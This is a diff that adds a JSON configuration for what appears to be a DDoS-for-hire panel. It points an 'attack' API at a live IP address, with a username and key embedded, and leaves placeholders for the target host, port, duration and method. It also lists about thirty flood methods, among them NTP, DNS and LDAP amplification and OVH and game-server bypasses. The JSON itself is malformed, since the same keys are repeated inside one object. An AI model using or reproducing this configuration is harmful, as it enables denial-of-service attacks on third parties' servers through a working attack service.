@@ -1,0 +1,86 @@
+{
+
+    "methods" : [
+        
+        {
+            "api_name" : "nulled",
+            "target" : "http://51.91.91.142:8085/api/attack?username=cali&key=caliacutie&host=[target]&port=[port]&time=[duration]&method=[method]",
+            "urlEncode" : true,
+            "attack_methods" : ["HOME", "NTP", "DNS", "APEX", "ARK", "APEX", "l7-reg", "L7-CF", "APEX-DROP", "OVH-NULLED", "100UP", "wra", "l7-dstat", "game-nulled", "ldap", "HTTP", "DSTAT", "TCP", "ovh-tcp", "NFO-TCP", "FIVEM", "SSH", "SSHV3", "SSHV2", "home-ampmix", "home-flood", "ovh-lite", "ovhbeta-vuln", "t-ftp"],
+
+            "custom_define" : [
+                
+                {
+                    "method" : "HOME",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "NTP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "DNS",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "APEX",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "ARK",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "L7-REG",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "L7-CF",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "OVH-NULLED",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "100UP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "WRA",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "L7-DSTAT",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "GAME-NULLED",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "LDAP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "HTTP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "DSTAT",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "TCP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "OVH-TCP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "NFO-TCP",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "FIVEM",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "SSH",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "SSHV2",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "method" : "SSHV3",
+                    "description" : "simple tcp attack flood sent through api",
+
+                    "default_port" : 80,
+                    "vip_method" : true
+                }
+            ]
+        }
+    ]
+}
